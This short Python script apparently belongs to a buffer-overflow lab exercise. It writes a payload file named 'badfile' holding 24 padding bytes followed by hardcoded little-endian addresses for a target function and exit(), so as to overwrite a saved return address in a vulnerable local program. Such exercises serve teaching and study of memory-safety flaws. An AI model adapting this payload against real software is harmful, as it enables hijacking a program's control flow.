import sys

shellcode = b''

content = bytearray(b'a'*24)

# content += b"bbbb"

echo_address = 0x565561bd

content += (echo_address).to_bytes(4, byteorder='little')

exit_address = 0xf7c3a1f0
content += (exit_address).to_bytes(4, byteorder='little')

print(content)

with open('badfile', 'wb') as f:
    f.write(content)
    
print("badfile created")
